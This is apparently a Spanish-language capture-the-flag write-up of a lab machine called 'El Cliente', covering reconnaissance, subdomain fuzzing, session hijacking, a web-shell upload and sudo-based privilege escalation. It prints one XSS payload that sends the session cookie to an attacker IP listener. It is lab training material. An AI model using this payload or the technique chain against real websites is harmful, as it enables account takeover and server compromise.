---
layout: default
title: El Cliente (THL)
---


# 🧠 Write-up: El Cliente (THL)

![portada](01e20966-33a2-4617-99cb-2ca6fe12332e.jpeg)

---

## 📸 Evidencias del proceso

### Reconocimiento y Escaneo Inicial
 Comenzamos la fase de reconocimiento con un escaneo de red utilizando nmap para identificar 
hosts activos en el rango 192.168.182.0/24. El resultado mostró la máquina objetivo 
192.168.182.138 con los siguientes servicios abiertos:<br>  
• 22/tcp (SSH): OpenSSH 9.6p1 Ubuntu 3ubuntu13.5<br>   
• 80/tcp (HTTP): Apache 2.4.58 (Ubuntu)<br>  

![1](1.png)

![2](2.png)

### Enumeración del Sitio Web
 Al acceder al servicio web en http://192.168.182.138, encontramos una página de inicio 
de Arka Construcciones con un formulario de contacto. Esto sugiere la posibilidad de 
inyección de código en los campos del formulario.

![3](3.png)

![4](4.png)

### Fuzzing de Subdominios
 Utilizando wfuzz, descubrimos un subdominio administrativo en admin.arka.thl. Al visitar 
la URL http://admin.arka.thl/login.php, encontramos un panel de autenticación.

![5](5.png)

![6](6.png)

### Explotación de XSS y Secuestro de Sesión
 Probamos una inyección de XSS en el formulario de contacto:
 ````
 <script>new Image().src='http://192.168.182.134:4444/?
 cookie='+document.cookie</script>
````
![7](7.png)

 Al enviar este payload, logramos capturar la cookie de sesión de un usuario autenticado en nuestro 
listener de netcat.

![8](8.png)

![9](9.png)

 Regresamos al sitio web de autenticación e insertamos el valor de la cookie capturada y obtenemos 
acceso al panel de administración.

![10](10.png)

![11](11.png)

### Ejecución Remota de Código (RCE) en Carga de Archivos
 El portal de administración permitía la carga de archivos.

![12](12.png)

 Probamos subiendo un shell.phar con el siguiente contenido:

![13](13.png)

![14](14.png)

 Una vez cargado el archivo, pudimos ejecutar comandos en la máquina víctima accediendo a:
http://admin.arka.thl/uploads/shell.phar?cmd=

![15](15.png)

![16](16.png)

 Esto nos dio ejecución remota mediante una reverse shell.

![18](18.png)

![19](19.png)

Investigando encontramos una base de datos con las credenciales del usuario Scott y nos 
conectamos mediante SSH.

![20](20.png)

![21](21.png)

![22](22.png)

### Escalada de Privilegios a Usuario kobe mediante tar
 Ejecutamos sudo -l y encontramos que el usuario scott podía ejecutar tar como kobe sin 
contraseña. Aprovechamos esto para obtener una shell como kobe:

![22.5](22.5.png)

 y escalamos a usuario Kobe de la siguiente forma:

![23](23.png)

###  Escalada de Priviledios a Root mediante systemctl
 Ejecutando sudo -l nuevamente, descubrimos que kobe podía ejecutar systemctl sin 
contraseña.

![24](24.png)

Creamos un servicio malicioso para otorgarnos privilegios de Root y tras ejecutar bash -p, 
obtuvimos el acceso como Root.

![25](25.png)

---

## 🧾 Conclusión
 Logramos comprometer la máquina objetivo explotando múltiples vulnerabilidades:<br>  
• XSS → Secuestro de sesión.<br>   
• Carga de archivos maliciosos → Ejecución remota de código.<br>   
• Abuso de sudo en tar → Escalada de privilegios a kobe.<br>   
• Uso de systemctl sin restricciones → Escalada a root.<br>  

###Write-up realizado por **c0k3r0** — El Sótano de c0k3r0 🕶️

[⬅️ Volver al inicio](https://c0k3r0.github.io/ctf-writeups/)



